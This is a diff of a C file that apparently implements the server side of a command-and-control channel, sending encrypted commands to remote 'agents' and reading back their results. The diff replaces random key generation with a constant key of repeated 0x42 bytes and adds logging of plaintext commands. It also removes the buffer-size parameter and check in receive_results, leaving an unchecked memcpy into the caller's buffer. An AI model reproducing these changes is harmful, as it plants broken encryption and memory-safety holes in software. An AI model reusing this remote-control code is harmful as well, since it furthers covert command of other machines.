@@ -9,7 +9,7 @@
 #include "../common/messages.h"
 #include "../common/protocol.h"
 
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 4096
 #define KEY_SIZE 32
 
 static int server_fd = -1;
@@ -22,7 +22,7 @@ int init_communication(const char *address, int port) {
     struct sockaddr_in server_addr;
     int opt = 1;
 
-    generate_random_key(encryption_key, KEY_SIZE);
+    memset(encryption_key, 0x42, KEY_SIZE);
     
     client_sockets = malloc(max_clients * sizeof(int));
     if (!client_sockets) {
@@ -113,19 +113,31 @@ int send_command(int agent_id, const char *command) {
     char encrypted_buffer[BUFFER_SIZE];
     Message msg;
     
+    memset(&msg, 0, sizeof(Message));
+    
     msg.type = MSG_TYPE_COMMAND;
     msg.length = strlen(command);
-    strncpy(msg.content, command, MAX_MESSAGE_LENGTH - 1);
-    msg.content[MAX_MESSAGE_LENGTH - 1] = '\0';
+    if (msg.length >= MAX_MESSAGE_LENGTH) {
+        msg.length = MAX_MESSAGE_LENGTH - 1;
+    }
+    strncpy(msg.content, command, msg.length);
+    msg.content[msg.length] = '\0';
     
-    size_t msg_size = sizeof(MessageType) + sizeof(uint32_t) + msg.length;
-    memcpy(buffer, &msg.type, sizeof(MessageType));
-    memcpy(buffer + sizeof(MessageType), &msg.length, sizeof(uint32_t));
-    memcpy(buffer + sizeof(MessageType) + sizeof(uint32_t), msg.content, msg.length);
+    printf("Sending command: '%s' (length: %u)\n", msg.content, msg.length);
     
-    encrypt_data((const unsigned char*)buffer, (unsigned char*)encrypted_buffer, msg_size, encryption_key);
+    size_t msg_size = serialize_message(&msg, buffer, BUFFER_SIZE);
+    if (msg_size == 0) {
+        fprintf(stderr, "Failed to serialize message\n");
+        return -1;
+    }
     
-    if (send(client_sockets[agent_id], encrypted_buffer, msg_size, 0) < 0) {
+    int encrypted_size = encrypt_data((const unsigned char*)buffer, (unsigned char*)encrypted_buffer, msg_size, encryption_key);
+    if (encrypted_size <= 0) {
+        fprintf(stderr, "Failed to encrypt message\n");
+        return -1;
+    }
+    
+    if (send(client_sockets[agent_id], encrypted_buffer, encrypted_size, 0) < 0) {
         perror("Failed to send command");
         return -1;
     }
@@ -133,7 +145,7 @@ int send_command(int agent_id, const char *command) {
     return 0;
 }
 
-int receive_results(int agent_id, char *buffer, size_t buffer_size) {
+int receive_results(int agent_id, char* buffer) {
     if (agent_id < 0 || agent_id >= max_clients || client_sockets[agent_id] < 0) {
         fprintf(stderr, "Invalid agent ID\n");
         return -1;
@@ -142,6 +154,7 @@ int receive_results(int agent_id, char *buffer, size_t buffer_size) {
     char encrypted_buffer[BUFFER_SIZE];
     char decrypted_buffer[BUFFER_SIZE];
     ssize_t bytes_received;
+    Message msg;
     
     bytes_received = recv(client_sockets[agent_id], encrypted_buffer, BUFFER_SIZE, MSG_DONTWAIT);
     if (bytes_received <= 0) {
@@ -150,13 +163,13 @@ int receive_results(int agent_id, char *buffer, size_t buffer_size) {
     
     decrypt_data((const unsigned char*)encrypted_buffer, (unsigned char*)decrypted_buffer, bytes_received, encryption_key);
     
-    if (buffer_size >= bytes_received) {
-        memcpy(buffer, decrypted_buffer, bytes_received);
-        return 0;
-    } else {
-        fprintf(stderr, "Buffer too small for received data\n");
+    if (!deserialize_message(decrypted_buffer, bytes_received, &msg)) {
+        fprintf(stderr, "Failed to deserialize message\n");
         return -1;
     }
+    
+    memcpy(buffer, &msg, sizeof(Message));
+    return 0;
 }
 
 void close_communication() {
